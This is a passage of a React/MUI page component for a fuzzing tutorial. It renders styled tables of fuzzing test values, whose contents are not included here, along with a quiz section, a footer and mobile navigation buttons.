                        <TableCell sx={{ fontFamily: "'Fira Code', monospace", color: cyber.neonYellow, borderColor: alpha(cyber.neonPurple, 0.2) }}>
                          {p.value}
                        </TableCell>
                        <TableCell sx={{ color: alpha("#fff", 0.8), borderColor: alpha(cyber.neonPurple, 0.2) }}>{p.reason}</TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>
            </Paper>

            {/* Floating Point */}
            <Paper
              sx={{
                p: 3,
                borderRadius: 2,
                mb: 3,
                bgcolor: alpha(cyber.darkCard, 0.9),
                border: `1px solid ${alpha("#ff6b35", 0.3)}`,
              }}
            >
              <Typography
                variant="h6"
                sx={{
                  fontWeight: 700,
                  mb: 2,
                  display: "flex",
                  alignItems: "center",
                  gap: 1,
                  color: "#ff6b35",
                  fontFamily: "'Orbitron', sans-serif",
                }}
              >
                <SpeedIcon /> FLOATING_POINT_VALUES
              </Typography>
              <TableContainer>
                <Table size="small">
                  <TableHead>
                    <TableRow>
                      <TableCell sx={{ fontWeight: 700, color: "#ff6b35", borderColor: alpha("#ff6b35", 0.3), fontFamily: "'Fira Code', monospace" }}>
                        VALUE
                      </TableCell>
                      <TableCell sx={{ fontWeight: 700, color: "#ff6b35", borderColor: alpha("#ff6b35", 0.3), fontFamily: "'Fira Code', monospace" }}>
                        REASON
                      </TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {additionalPayloads.floatingPoint.map((p, i) => (
                      <TableRow key={i} sx={{ "&:hover": { bgcolor: alpha("#ff6b35", 0.05) } }}>
                        <TableCell sx={{ fontFamily: "'Fira Code', monospace", color: cyber.neonYellow, borderColor: alpha("#ff6b35", 0.2) }}>
                          {p.value}
                        </TableCell>
                        <TableCell sx={{ color: alpha("#fff", 0.8), borderColor: alpha("#ff6b35", 0.2) }}>{p.reason}</TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>
            </Paper>

            {/* Unicode */}
            <Paper
              sx={{
                p: 3,
                borderRadius: 2,
                mb: 3,
                bgcolor: alpha(cyber.darkCard, 0.9),
                border: `1px solid ${alpha("#00d4aa", 0.3)}`,
              }}
            >
              <Typography
                variant="h6"
                sx={{
                  fontWeight: 700,
                  mb: 2,
                  display: "flex",
                  alignItems: "center",
                  gap: 1,
                  color: "#00d4aa",
                  fontFamily: "'Orbitron', sans-serif",
                }}
              >
                <HttpIcon /> UNICODE_VALUES
              </Typography>
              <TableContainer>
                <Table size="small">
                  <TableHead>
                    <TableRow>
                      <TableCell sx={{ fontWeight: 700, color: "#00d4aa", borderColor: alpha("#00d4aa", 0.3), fontFamily: "'Fira Code', monospace" }}>
                        VALUE
                      </TableCell>
                      <TableCell sx={{ fontWeight: 700, color: "#00d4aa", borderColor: alpha("#00d4aa", 0.3), fontFamily: "'Fira Code', monospace" }}>
                        REASON
                      </TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {additionalPayloads.unicode.map((p, i) => (
                      <TableRow key={i} sx={{ "&:hover": { bgcolor: alpha("#00d4aa", 0.05) } }}>
                        <TableCell sx={{ fontFamily: "'Fira Code', monospace", color: cyber.neonPink, borderColor: alpha("#00d4aa", 0.2) }}>
                          {p.value}
                        </TableCell>
                        <TableCell sx={{ color: alpha("#fff", 0.8), borderColor: alpha("#00d4aa", 0.2) }}>{p.reason}</TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>
            </Paper>

            {/* Timing */}
            <Paper
              sx={{
                p: 3,
                borderRadius: 2,
                mb: 3,
                bgcolor: alpha(cyber.darkCard, 0.9),
                border: `1px solid ${alpha("#7c3aed", 0.3)}`,
              }}
            >
              <Typography
                variant="h6"
                sx={{
                  fontWeight: 700,
                  mb: 2,
                  display: "flex",
                  alignItems: "center",
                  gap: 1,
                  color: "#7c3aed",
                  fontFamily: "'Orbitron', sans-serif",
                }}
              >
                <SettingsIcon /> TIMING_VALUES
              </Typography>
              <TableContainer>
                <Table size="small">
                  <TableHead>
                    <TableRow>
                      <TableCell sx={{ fontWeight: 700, color: "#7c3aed", borderColor: alpha("#7c3aed", 0.3), fontFamily: "'Fira Code', monospace" }}>
                        VALUE
                      </TableCell>
                      <TableCell sx={{ fontWeight: 700, color: "#7c3aed", borderColor: alpha("#7c3aed", 0.3), fontFamily: "'Fira Code', monospace" }}>
                        REASON
                      </TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {additionalPayloads.timing.map((p, i) => (
                      <TableRow key={i} sx={{ "&:hover": { bgcolor: alpha("#7c3aed", 0.05) } }}>
                        <TableCell sx={{ fontFamily: "'Fira Code', monospace", color: cyber.neonCyan, borderColor: alpha("#7c3aed", 0.2) }}>
                          {p.value}
                        </TableCell>
                        <TableCell sx={{ color: alpha("#fff", 0.8), borderColor: alpha("#7c3aed", 0.2) }}>{p.reason}</TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>
            </Paper>

            {/* Path Traversal */}
            <Paper
              sx={{
                p: 3,
                borderRadius: 2,
                bgcolor: alpha(cyber.darkCard, 0.9),
                border: `1px solid ${alpha("#ef4444", 0.3)}`,
              }}
            >
              <Typography
                variant="h6"
                sx={{
                  fontWeight: 700,
                  mb: 2,
                  display: "flex",
                  alignItems: "center",
                  gap: 1,
                  color: "#ef4444",
                  fontFamily: "'Orbitron', sans-serif",
                }}
              >
                <StorageIcon /> PATH_TRAVERSAL_VALUES
              </Typography>
              <TableContainer>
                <Table size="small">
                  <TableHead>
                    <TableRow>
                      <TableCell sx={{ fontWeight: 700, color: "#ef4444", borderColor: alpha("#ef4444", 0.3), fontFamily: "'Fira Code', monospace" }}>
                        VALUE
                      </TableCell>
                      <TableCell sx={{ fontWeight: 700, color: "#ef4444", borderColor: alpha("#ef4444", 0.3), fontFamily: "'Fira Code', monospace" }}>
                        REASON
                      </TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {additionalPayloads.paths.map((p, i) => (
                      <TableRow key={i} sx={{ "&:hover": { bgcolor: alpha("#ef4444", 0.05) } }}>
                        <TableCell sx={{ fontFamily: "'Fira Code', monospace", color: cyber.neonGreen, borderColor: alpha("#ef4444", 0.2) }}>
                          {p.value}
                        </TableCell>
                        <TableCell sx={{ color: alpha("#fff", 0.8), borderColor: alpha("#ef4444", 0.2) }}>{p.reason}</TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>
            </Paper>
          </Box>

          {/* Section: Quiz */}
          <Paper
            id="quiz"
            sx={{
              p: 4,
              borderRadius: 2,
              mb: 4,
              bgcolor: alpha(cyber.darkCard, 0.9),
              border: `2px solid ${cyber.neonCyan}`,
              boxShadow: `0 0 40px ${alpha(cyber.neonCyan, 0.3)}`,
              scrollMarginTop: "140px",
              position: "relative",
              "&::before": {
                content: '""',
                position: "absolute",
                top: 0,
                left: 0,
                right: 0,
                height: "3px",
                background: `linear-gradient(90deg, ${cyber.neonCyan}, ${cyber.neonMagenta}, ${cyber.neonPink})`,
              },
            }}
          >
            <Typography
              variant="h4"
              sx={{
                fontWeight: 800,
                mb: 3,
                display: "flex",
                alignItems: "center",
                gap: 2,
                fontFamily: "'Orbitron', sans-serif",
                color: cyber.neonCyan,
                textShadow: `0 0 20px ${alpha(cyber.neonCyan, 0.5)}`,
              }}
            >
              <QuizIcon sx={{ filter: `drop-shadow(0 0 10px ${cyber.neonCyan})` }} />
              KNOWLEDGE VERIFICATION
            </Typography>
            <QuizSection
              questions={quizQuestions}
              accentColor={QUIZ_ACCENT_COLOR}
              title="Fuzzing Deep Dive Knowledge Check"
              description="Random 10-question quiz drawn from a 108-question bank covering fundamentals, tools, kernel fuzzing, smart contracts, CVEs, and more."
              questionsPerQuiz={QUIZ_QUESTION_COUNT}
            />
          </Paper>

          {/* Footer CTA */}
          <Paper
            sx={{
              p: 4,
              borderRadius: 2,
              textAlign: "center",
              bgcolor: alpha(cyber.darkCard, 0.9),
              border: `1px solid ${alpha(cyber.neonCyan, 0.5)}`,
              boxShadow: `0 0 30px ${alpha(cyber.neonCyan, 0.2)}`,
              position: "relative",
              overflow: "hidden",
              "&::before": {
                content: '""',
                position: "absolute",
                top: 0,
                left: 0,
                right: 0,
                bottom: 0,
                background: `radial-gradient(ellipse at center, ${alpha(cyber.neonCyan, 0.1)}, transparent 70%)`,
              },
            }}
          >
            <Typography
              variant="h5"
              sx={{
                fontWeight: 700,
                mb: 1,
                fontFamily: "'Orbitron', sans-serif",
                color: cyber.neonCyan,
                textShadow: `0 0 20px ${cyber.neonCyan}`,
              }}
            >
              INITIATE BUG HUNTING PROTOCOL
            </Typography>
            <Typography variant="body2" sx={{ mb: 3, color: alpha("#fff", 0.7), position: "relative" }}>
              Fuzzing has discovered thousands of critical vulnerabilities. Deploy AFL++ and begin your hunt.
            </Typography>
            <Box sx={{ display: "flex", gap: 2, justifyContent: "center", flexWrap: "wrap", position: "relative" }}>
              <Chip
                label="< RETURN TO HUB"
                clickable
                onClick={() => navigate("/learn")}
                sx={{
                  fontWeight: 600,
                  fontFamily: "'Orbitron', sans-serif",
                  color: cyber.neonMagenta,
                  borderColor: cyber.neonMagenta,
                  border: `1px solid`,
                  "&:hover": {
                    bgcolor: alpha(cyber.neonMagenta, 0.2),
                    boxShadow: `0 0 20px ${cyber.neonMagenta}`,
                  },
                }}
              />
              <Chip
                label="COMMANDS REF >"
                clickable
                onClick={() => navigate("/learn/commands")}
                sx={{
                  bgcolor: cyber.neonCyan,
                  color: cyber.darkBg,
                  fontWeight: 700,
                  fontFamily: "'Orbitron', sans-serif",
                  boxShadow: `0 0 20px ${cyber.neonCyan}`,
                  "&:hover": {
                    bgcolor: alpha(cyber.neonCyan, 0.8),
                    boxShadow: `0 0 30px ${cyber.neonCyan}`,
                  },
                }}
              />
            </Box>
          </Paper>
        </Box>

        {/* Mobile FAB */}
        {isMobile && (
          <>
            <Fab
              onClick={() => setNavDrawerOpen(true)}
              sx={{
                position: "fixed",
                bottom: 80,
                right: 16,
                bgcolor: cyber.neonCyan,
                color: cyber.darkBg,
                boxShadow: `0 0 30px ${cyber.neonCyan}`,
                "&:hover": {
                  bgcolor: alpha(cyber.neonCyan, 0.8),
                  boxShadow: `0 0 40px ${cyber.neonCyan}`,
                },
              }}
            >
              <ListAltIcon />
            </Fab>
            <Fab
              size="small"
              onClick={scrollToTop}
              sx={{
                position: "fixed",
                bottom: 140,
                right: 16,
                bgcolor: alpha(cyber.darkPanel, 0.95),
                color: cyber.neonMagenta,
                border: `1px solid ${cyber.neonMagenta}`,
                "&:hover": {
                  bgcolor: alpha(cyber.neonMagenta, 0.2),
                  boxShadow: `0 0 15px ${cyber.neonMagenta}`,
                },
              }}
            >
              <KeyboardArrowUpIcon />
            </Fab>
          </>
        )}

        {/* Mobile Navigation Drawer */}
        {mobileDrawer}
      </Box>
    </LearnPageLayout>
  );
}
